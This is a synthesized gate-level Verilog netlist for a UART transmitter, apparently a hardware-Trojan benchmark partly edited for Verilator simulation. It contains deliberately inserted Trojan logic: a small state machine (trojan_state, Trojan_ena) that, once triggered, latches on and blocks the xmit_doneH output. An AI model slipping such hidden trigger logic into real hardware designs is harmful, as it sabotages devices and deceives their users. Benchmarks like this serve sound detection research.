/////////////////////////////////////////////////////////////
// Created by: Synopsys DC Ultra(TM) in wire load mode
// Version   : R-2020.09-SP4
// Date      : Mon Oct 11 13:27:24 2021
/////////////////////////////////////////////////////////////
`timescale 1ps / 1ps

module u_xmit ( clk, rst, uart_xmitH, xmitH, xmit_dataH, xmit_doneH );
  input [7:0] xmit_dataH;
  input clk, rst, xmitH;
  output uart_xmitH, xmit_doneH;
  wire   N37, N38, N39, N40, N58, N59, N60, N61, N62, N63, N64, N65,
         Trojan_ena, N122, n51, n52, n53, n54, n55, n56, n57, n58, n59, n60,
         n61, n62, n63, n64, n65, n66, n67, n68, n69, n71, n72, n73, n74, n75,
         n76, n77, n78, n79, n80, n81, n82, n83, n84, n85, n86, n87, n88, n89,
         n90, n91, n92, n93, n94, n95, n96, n97, n98, n99, n100, n101, n102,
          n104, n105;
  wire   [7:0] xmit_ShiftRegH;
  wire   [3:0] bitCell_cntrH/*verilator public*/;
  reg    [2:0] state/*verilator public*/;
  wire   [3:0] bitCountH/*verilator public*/;
  wire   [2:0] next_state;
  wire   [1:0] trojan_state;

  reg	 n103;
  
always @(posedge clk) 
begin
 if(rst==1'b0)
  begin
  state[0] = 1'b0;
  state[1] = 1'b0; 
  state[2] = 1'b0; 
  end
 else 
  begin
  state[0] = next_state[0];
  n103 = ~next_state[0];
  state[1] = next_state[1];
  //n104 = ~next_state[1];
  state[2] = next_state[2];
  end
end

  //DFFARX1 \state_reg[0]  ( .D(next_state[0]), .CLK(clk), .RSTB(rst), .Q(        state[0]), .QN(n103) );
  //DFFARX1 \state_reg[1]  ( .D(next_state[1]), .CLK(clk), .RSTB(rst), .Q(        state[1]), .QN() );
  //DFFARX1 \state_reg[2]  ( .D(next_state[2]), .CLK(clk), .RSTB(rst), .Q(        state[2]), .QN() );
  DFFARX1 \bitCell_cntrH_reg[0]  ( .D(N37), .CLK(clk), .RSTB(rst), .Q(
        bitCell_cntrH[0]), .QN(n100) );
  DFFARX1 \bitCell_cntrH_reg[1]  ( .D(N38), .CLK(clk), .RSTB(rst), .Q(
        bitCell_cntrH[1]), .QN(n102) );
  DFFARX1 \bitCell_cntrH_reg[2]  ( .D(N39), .CLK(clk), .RSTB(rst), .Q(
        bitCell_cntrH[2]), .QN() );
  DFFARX1 \bitCell_cntrH_reg[3]  ( .D(N40), .CLK(clk), .RSTB(rst), .Q(
        bitCell_cntrH[3]), .QN() );
  DFFARX1 \xmit_ShiftRegH_reg[7]  ( .D(N65), .CLK(clk), .RSTB(rst), .Q(
        xmit_ShiftRegH[7]), .QN() );
  DFFARX1 \xmit_ShiftRegH_reg[6]  ( .D(N64), .CLK(clk), .RSTB(rst), .Q(
        xmit_ShiftRegH[6]), .QN() );
  DFFARX1 \xmit_ShiftRegH_reg[5]  ( .D(N63), .CLK(clk), .RSTB(rst), .Q(
        xmit_ShiftRegH[5]), .QN() );
  DFFARX1 \xmit_ShiftRegH_reg[4]  ( .D(N62), .CLK(clk), .RSTB(rst), .Q(
        xmit_ShiftRegH[4]), .QN() );
  DFFARX1 \xmit_ShiftRegH_reg[3]  ( .D(N61), .CLK(clk), .RSTB(rst), .Q(
        xmit_ShiftRegH[3]), .QN() );
  DFFARX1 \xmit_ShiftRegH_reg[2]  ( .D(N60), .CLK(clk), .RSTB(rst), .Q(
        xmit_ShiftRegH[2]), .QN() );
  DFFARX1 \xmit_ShiftRegH_reg[1]  ( .D(N59), .CLK(clk), .RSTB(rst), .Q(
        xmit_ShiftRegH[1]), .QN() );
  DFFARX1 \xmit_ShiftRegH_reg[0]  ( .D(N58), .CLK(clk), .RSTB(rst), .Q(
        xmit_ShiftRegH[0]), .QN() );
  DFFARX1 \bitCountH_reg[3]  ( .D(n54), .CLK(clk), .RSTB(rst), .Q(bitCountH[3]), .QN(n101) );
  DFFARX1 \bitCountH_reg[0]  ( .D(n57), .CLK(clk), .RSTB(rst), .Q(bitCountH[0]), .QN() );
  DFFARX1 \bitCountH_reg[1]  ( .D(n56), .CLK(clk), .RSTB(rst), .Q(bitCountH[1]), .QN(n104) );
  DFFARX1 \bitCountH_reg[2]  ( .D(n55), .CLK(clk), .RSTB(rst), .Q(bitCountH[2]), .QN() );
  DFFARX1 \trojan_state_reg[0]  ( .D(n53), .CLK(clk), .RSTB(rst), .Q(
        trojan_state[0]), .QN(n105) );
  DFFARX1 \trojan_state_reg[1]  ( .D(n52), .CLK(clk), .RSTB(rst), .Q(
        trojan_state[1]), .QN() );
  DFFARX1 Trojan_ena_reg ( .D(n51), .CLK(clk), .RSTB(rst), .Q(Trojan_ena), 
        .QN() );
  DFFARX1 xmit_doneH_reg ( .D(N122), .CLK(clk), .RSTB(rst), .Q(xmit_doneH), 
        .QN() );
  NAND2X0 U77 ( .IN1(n86), .IN2(n84), .QN(n94) );
  NAND2X0 U78 ( .IN1(xmitH), .IN2(n75), .QN(n82) );
  NAND2X0 U79 ( .IN1(bitCell_cntrH[3]), .IN2(n68), .QN(n78) );
  NAND2X0 U80 ( .IN1(n85), .IN2(n77), .QN(n59) );
  NAND2X0 U81 ( .IN1(n61), .IN2(n73), .QN(next_state[2]) );
  NAND2X0 U82 ( .IN1(state[0]), .IN2(state[1]), .QN(n71) );
  INVX0 U83 ( .INP(n71), .ZN(n63) );
  NAND2X0 U84 ( .IN1(state[2]), .IN2(n103), .QN(n72) );
  INVX0 U85 ( .INP(n72), .ZN(n81) );
  NOR2X0 U86 ( .IN1(n63), .IN2(n81), .QN(n60) );
  NOR2X0 U87 ( .IN1(state[1]), .IN2(state[2]), .QN(n75) );
  INVX0 U88 ( .INP(n75), .ZN(n85) );
  NAND2X0 U89 ( .IN1(state[0]), .IN2(state[2]), .QN(n77) );
  NOR2X0 U90 ( .IN1(n60), .IN2(n59), .QN(n58) );
  AO22X1 U91 ( .IN1(n60), .IN2(n59), .IN3(xmit_ShiftRegH[0]), .IN4(n58), .Q(
        uart_xmitH) );
  NAND4X0 U92 ( .IN1(bitCell_cntrH[2]), .IN2(bitCell_cntrH[1]), .IN3(
        bitCell_cntrH[3]), .IN4(n100), .QN(n62) );
  NOR2X0 U93 ( .IN1(n71), .IN2(n62), .QN(n86) );
  INVX0 U94 ( .INP(n86), .ZN(n61) );
  AND3X1 U95 ( .IN1(bitCell_cntrH[1]), .IN2(bitCell_cntrH[2]), .IN3(
        bitCell_cntrH[0]), .Q(n68) );
  NAND3X0 U96 ( .IN1(state[2]), .IN2(state[0]), .IN3(n78), .QN(n73) );
  NAND2X0 U97 ( .IN1(n103), .IN2(state[1]), .QN(n98) );
  NAND2X0 U98 ( .IN1(n63), .IN2(n62), .QN(n76) );
  AND2X1 U99 ( .IN1(n73), .IN2(n76), .Q(n64) );
  NAND2X0 U100 ( .IN1(n98), .IN2(n64), .QN(n69) );
  INVX0 U101 ( .INP(n69), .ZN(n67) );
  NOR2X0 U102 ( .IN1(bitCell_cntrH[0]), .IN2(n67), .QN(N37) );
  OA221X1 U103 ( .IN1(bitCell_cntrH[0]), .IN2(bitCell_cntrH[1]), .IN3(n100), 
        .IN4(n102), .IN5(n69), .Q(N38) );
  NOR2X0 U104 ( .IN1(n102), .IN2(n100), .QN(n65) );
  NOR2X0 U105 ( .IN1(bitCell_cntrH[2]), .IN2(n65), .QN(n66) );
  NOR3X0 U106 ( .IN1(n68), .IN2(n67), .IN3(n66), .QN(N39) );
  OA221X1 U108 ( .IN1(1'b0), .IN2(n69), .IN3(bitCell_cntrH[3]), .IN4(n68), 
        .IN5(n78), .Q(N40) );
  OR4X1 U109 ( .IN1(n101), .IN2(bitCountH[1]), .IN3(bitCountH[2]), .IN4(
        bitCountH[0]), .Q(n84) );
  OA22X1 U110 ( .IN1(n71), .IN2(n84), .IN3(n98), .IN4(n78), .Q(n74) );
  NAND4X0 U111 ( .IN1(n74), .IN2(n73), .IN3(n76), .IN4(n72), .QN(next_state[0]) );
  INVX0 U112 ( .INP(n82), .ZN(n83) );
  NOR2X0 U113 ( .IN1(n81), .IN2(n83), .QN(n80) );
  NAND3X0 U114 ( .IN1(n80), .IN2(n98), .IN3(n76), .QN(next_state[1]) );
  OA22X1 U115 ( .IN1(xmitH), .IN2(n85), .IN3(n78), .IN4(n77), .Q(n79) );
  NOR2X0 U116 ( .IN1(Trojan_ena), .IN2(n79), .QN(N122) );
  AO222X1 U117 ( .IN1(n81), .IN2(xmit_ShiftRegH[1]), .IN3(n83), .IN4(
        xmit_dataH[0]), .IN5(xmit_ShiftRegH[0]), .IN6(n80), .Q(N58) );
  AO222X1 U118 ( .IN1(n81), .IN2(xmit_ShiftRegH[2]), .IN3(n80), .IN4(
        xmit_ShiftRegH[1]), .IN5(n83), .IN6(xmit_dataH[1]), .Q(N59) );
  AO222X1 U119 ( .IN1(n81), .IN2(xmit_ShiftRegH[3]), .IN3(n80), .IN4(
        xmit_ShiftRegH[2]), .IN5(n83), .IN6(xmit_dataH[2]), .Q(N60) );
  AO222X1 U120 ( .IN1(n81), .IN2(xmit_ShiftRegH[4]), .IN3(n80), .IN4(
        xmit_ShiftRegH[3]), .IN5(n83), .IN6(xmit_dataH[3]), .Q(N61) );
  AO222X1 U121 ( .IN1(n81), .IN2(xmit_ShiftRegH[5]), .IN3(n80), .IN4(
        xmit_ShiftRegH[4]), .IN5(n83), .IN6(xmit_dataH[4]), .Q(N62) );
  AO222X1 U122 ( .IN1(n81), .IN2(xmit_ShiftRegH[6]), .IN3(n80), .IN4(
        xmit_ShiftRegH[5]), .IN5(n83), .IN6(xmit_dataH[5]), .Q(N63) );
  AO222X1 U123 ( .IN1(n81), .IN2(xmit_ShiftRegH[7]), .IN3(n80), .IN4(
        xmit_ShiftRegH[6]), .IN5(n83), .IN6(xmit_dataH[6]), .Q(N64) );
  AO221X1 U124 ( .IN1(n83), .IN2(xmit_dataH[7]), .IN3(n82), .IN4(
        xmit_ShiftRegH[7]), .IN5(n81), .Q(N65) );
  OA221X1 U125 ( .IN1(n85), .IN2(state[0]), .IN3(n85), .IN4(xmitH), .IN5(n94), 
        .Q(n88) );
  NOR2X0 U126 ( .IN1(bitCountH[0]), .IN2(n94), .QN(n87) );
  AO21X1 U127 ( .IN1(n88), .IN2(bitCountH[0]), .IN3(n87), .Q(n57) );
  NAND2X0 U128 ( .IN1(n86), .IN2(bitCountH[0]), .QN(n90) );
  NOR2X0 U129 ( .IN1(n88), .IN2(n87), .QN(n91) );
  MUX21X1 U130 ( .IN1(n90), .IN2(n91), .S(bitCountH[1]), .Q(n89) );
  INVX0 U131 ( .INP(n89), .ZN(n56) );
  NOR2X0 U132 ( .IN1(n104), .IN2(n90), .QN(n96) );
  OA21X1 U133 ( .IN1(bitCountH[1]), .IN2(n94), .IN3(n91), .Q(n93) );
  INVX0 U134 ( .INP(n93), .ZN(n92) );
  MUX21X1 U135 ( .IN1(n96), .IN2(n92), .S(bitCountH[2]), .Q(n55) );
  OAI21X1 U136 ( .IN1(bitCountH[2]), .IN2(n94), .IN3(n93), .QN(n95) );
  OA222X1 U137 ( .IN1(bitCountH[3]), .IN2(bitCountH[2]), .IN3(bitCountH[3]), 
        .IN4(n96), .IN5(n101), .IN6(n95), .Q(n54) );
  NOR2X0 U138 ( .IN1(trojan_state[1]), .IN2(n98), .QN(n97) );
  MUX21X1 U139 ( .IN1(trojan_state[0]), .IN2(state[2]), .S(n97), .Q(n53) );
  NOR2X0 U140 ( .IN1(n98), .IN2(state[2]), .QN(n99) );
  AO21X1 U141 ( .IN1(n99), .IN2(trojan_state[0]), .IN3(trojan_state[1]), .Q(
        n52) );
  AO21X1 U142 ( .IN1(trojan_state[1]), .IN2(n105), .IN3(Trojan_ena), .Q(n51)
         );
endmodule

